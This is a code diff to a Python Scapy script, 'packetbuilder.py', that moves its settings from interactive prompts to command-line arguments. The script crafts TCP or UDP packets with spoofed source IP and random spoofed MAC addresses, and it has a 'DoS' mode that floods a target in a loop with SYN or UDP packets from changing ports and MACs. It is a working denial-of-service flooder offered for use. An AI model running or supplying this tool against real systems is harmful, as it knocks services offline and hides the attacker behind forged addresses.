@@ -1,6 +1,31 @@
 from scapy.all import *
 import random
 
+
+###################################################################################################
+# Usage:                                                                                          #
+# python3.6 packetbuilder.py [MACSPOOF] [SRCIP] [DSTIP] [PROT] [DSTPORT] [FLAG] [Message] [DOS]    #
+#                                                                                                 #
+# Example:                                                                                        #
+# python3.6 packetbuilder.py YES 5.5.5.5 192.168.188.1 TCP 80 S "Test:)" YES                      #
+#                                                                                                 #
+###################################################################################################
+#Define your interface
+interface="en0"
+
+macspoof, srcip, dstip, prot, port, flag, msg, dos = "","","","","","","",""
+
+#Define parameter
+if len(sys.argv) > 1 :
+    macspoof = sys.argv[1]
+    srcip = sys.argv[2]
+    dstip = sys.argv[3]
+    prot = sys.argv[4]
+    port = int(sys.argv[5])
+    flag = sys.argv[6]
+    msg = sys.argv[7]
+    dos = sys.argv[8]
+
 def macspoofer():
     x1=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
     x2=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
@@ -12,44 +37,50 @@ def macspoofer():
     mac=mac[0]+":"+mac[1]+":"+mac[2]+":"+mac[3]+":"+mac[4]+":"+mac[5]
     return mac
 
-print ("Enable Mac Spoofer? - [YES] or [NO]:")
-macspoof=str(input())
-macspoof=macspoof.upper()
+if macspoof == "":
+    print ("Enable Mac Spoofer? - [YES] or [NO]:")
+    macspoof=str(input())
+    macspoof=macspoof.upper()
 
 if macspoof == "YES":
     mac=macspoofer()
     print("Using SRC-MAC-Address: "+mac)
     etherframe=Ether(src=mac)
 
-print("SRC_IP: ")
-srcip= str(input())
+if srcip == "":
+    print("SRC_IP: ")
+    srcip= str(input())
 
-print("DST_IP: ")
-dstip= str(input())
+if dstip == "":
+    print("DST_IP: ")
+    dstip= str(input())
 
-print("Choose [TCP] or [UDP]: ")
-prot=str(input())
-prot=prot.upper()
+if prot == "":
+    print("Choose [TCP] or [UDP]: ")
+    prot=str(input())
+    prot=prot.upper()
 
-print("Choose DST-Port: ")
-port=int(input())
+if port == "":
+    print("Choose DST-Port: ")
+    port=int(input())
 
-if prot == "TCP":
-    print("Choose Flag (when TCP) : [S],[SA],[A] ")
-    flag=str(input())
-    flag=flag.upper()
+if prot == "" or prot == "TCP":
+        print("Choose Flag: [S],[SA],[A] ")
+        flag=str(input())
+        flag=flag.upper()
 
-print ("Enter message for sending..:")
-msg=str(input())
+if msg == "":
+    print ("Enter message for sending..:")
+    msg=str(input())
+
 length=len(msg)
 length2=int(1460/length)
-
 data=Raw(load=msg*length2)
-print(len(data))
 
-print ("DoS? - [YES] or [NO] :-)  : ")
-dos=str(input())
-dos=dos.upper()
+if dos == "":
+    print ("DoS? - [YES] or [NO] :-)  : ")
+    dos=str(input())
+    dos=dos.upper()
 
 # Build IP-Header
 iphdr=IP(src=srcip,dst=dstip)
@@ -77,7 +108,7 @@ if prot == "UDP":
 # Send the packet
 
 if macspoof == "YES":
-    sendp(packet, iface="en0")
+    sendp(packet, iface=interface)
 else:
     send(packet)
 
@@ -91,13 +122,13 @@ if dos =="YES":
                 srcport=random.randrange(1025,65535)
                 tcp=TCP(sport=srcport,dport=port,flags=flag)
                 packet=etherframe/iphdr/tcp/data
-                sendp(packet, iface="en0")
+                sendp(packet, iface=interface)
             else:
                 mac=macspoofer()
                 etherframe=Ether(src=mac)
                 srcport=random.randrange(1025,65535)
                 udp=UDP(sport=srcport,dport=port)
                 packet=etherframe/iphdr/udp/data
-                sendp(packet, iface="en0")
+                sendp(packet, iface=interface)
         else:
             send(packet)
